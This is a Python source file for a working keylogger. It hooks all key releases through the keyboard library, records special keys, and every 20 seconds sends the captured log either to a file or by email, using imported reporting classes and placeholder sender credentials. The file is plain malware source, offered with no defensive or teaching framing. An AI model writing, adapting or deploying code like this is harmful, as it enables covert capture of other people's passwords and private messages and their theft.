import keyboard
from threading import Timer
from datetime import datetime

from classes.file_reporting import FileReporting
from classes.email_reporting import EmailReporting


class Keylogger:
    email = "email@provider.tld"
    password = "password_here"
    log = ""

    email_reporting = EmailReporting(email, password)
    file_reporting = FileReporting()

    def __init__(self, interval, report_method="file") -> None:
        self.interval = interval
        self.report_method = report_method

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # Invoked when a key is pressed
        name = event.name

        if len(name) > 1:
            # to haandle special keys
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # Check if there is something
            self.end_dt = datetime.now()

            if self.report_method == "email":
                self.email_reporting.report(self.log)
            elif self.report_method == "file":
                self.file_reporting.report(
                    self.start_dt, self.end_dt, self.log)

            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()

        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()

        print(f"{datetime.now()} - Started keylogger")

        keyboard.wait()


REPORT_INTERVAL = 20

keylogger = Keylogger(interval=REPORT_INTERVAL, report_method="file")
keylogger.start()
